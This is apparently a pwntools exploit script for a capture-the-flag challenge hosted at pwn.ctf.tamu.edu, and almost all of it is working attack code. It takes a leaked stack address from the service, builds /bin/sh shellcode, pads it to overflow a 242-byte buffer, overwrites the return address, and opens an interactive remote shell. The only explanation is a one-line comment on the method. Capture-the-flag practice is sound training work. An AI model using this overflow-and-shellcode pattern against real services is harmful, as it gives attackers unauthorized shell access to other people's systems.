# Random value is buffer stack address and can be jumped to using the buffer-overflow technique. The nc flag is not set so the pwnlib shellcraft module is used to generate /bin/sh shellcode.

from pwn import *

context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'

r = remote('pwn.ctf.tamu.edu',4323)
#r = remote('192.168.122.76',4323)

r.recvuntil('Your random number ')
leak = r.recvline()
stackAddress = int(leak[:len(leak)-2], 16)
log.info("Stack Address:" + str(hex(stackAddress)))

exp = asm(shellcraft.sh() + shellcraft.exit())
exp += "A" * (242 - len(exp))
exp += p32(stackAddress)

r.sendline(exp)
r.interactive()
